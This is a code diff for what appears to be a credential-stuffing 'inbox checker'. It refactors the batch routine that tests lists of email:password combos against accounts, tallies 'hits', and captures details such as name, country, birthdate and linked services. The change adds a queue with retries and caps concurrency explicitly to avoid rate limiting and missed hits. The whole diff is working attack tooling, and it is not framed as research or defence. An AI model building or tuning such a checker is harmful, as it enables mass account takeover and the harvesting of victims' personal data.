@@ -614,61 +614,62 @@ async function checkSingleAccount(email, password) {
   return result;
 }
 
-// ── Batch checker ───────────────────────────────────────────
+// ── Batch checker (controlled concurrency, no skipped hits) ──
 
-async function checkInboxAccounts(accounts, threads = 5, onProgress, signal) {
+const { runQueue } = require("./account-queue");
+
+async function checkInboxAccounts(accounts, threads = 3, onProgress, signal) {
   const results = [];
-  let currentIndex = 0;
-  let completed = 0;
   let hitCount = 0;
   let failCount = 0;
 
-  async function worker() {
-    while (true) {
-      if (signal?.aborted) break;
-      const idx = currentIndex++;
-      if (idx >= accounts.length) break;
+  // Cap at 3 to prevent rate-limiting + skips.
+  const concurrency = Math.min(threads || 3, 3);
 
-      const combo = accounts[idx];
+  await runQueue({
+    items: accounts,
+    concurrency,
+    maxRetries: 1,
+    signal,
+    runner: async (combo, attempt) => {
       const parts = combo.split(":");
       if (parts.length < 2 || !parts[0].trim() || !parts[1].trim()) {
-        results.push({
-          user: parts[0]?.trim() || combo,
-          password: parts[1]?.trim() || "",
-          status: "fail",
-          captures: {},
-          services: {},
-          detail: "invalid format",
-          country: "",
-          name: "",
-          birthdate: "",
-        });
-        completed++;
-        continue;
+        return {
+          result: {
+            user: parts[0]?.trim() || combo,
+            password: parts[1]?.trim() || "",
+            status: "fail",
+            captures: {},
+            services: {},
+            detail: "invalid format",
+            country: "",
+            name: "",
+            birthdate: "",
+          },
+        };
       }
-
       const email = parts[0].trim();
       const pw = parts.slice(1).join(":").trim();
       const r = await checkSingleAccount(email, pw);
+      // Retry once on a transient retry status (caller already retried internally,
+      // this catches anything that escaped that)
+      if (r.status === "retry" && attempt < 1) return { retry: true };
+      return { result: r };
+    },
+    onResult: (r, completed, total) => {
       results.push(r);
-      completed++;
-
-      if (r.status === "hit") hitCount++;
+      if (r && r.status === "hit") hitCount++;
       else failCount++;
-
       if (onProgress) {
         try {
-          onProgress(completed, accounts.length, r.status, hitCount, failCount, r);
+          onProgress(completed, total, r?.status, hitCount, failCount, r);
         } catch {
-          try { onProgress(completed, accounts.length); } catch {}
+          try { onProgress(completed, total); } catch {}
         }
       }
-    }
-  }
+    },
+  });
 
-  const concurrency = Math.min(threads, 50);
-  const workers = Array(Math.min(concurrency, accounts.length)).fill(null).map(() => worker());
-  await Promise.all(workers);
   return results;
 }
 
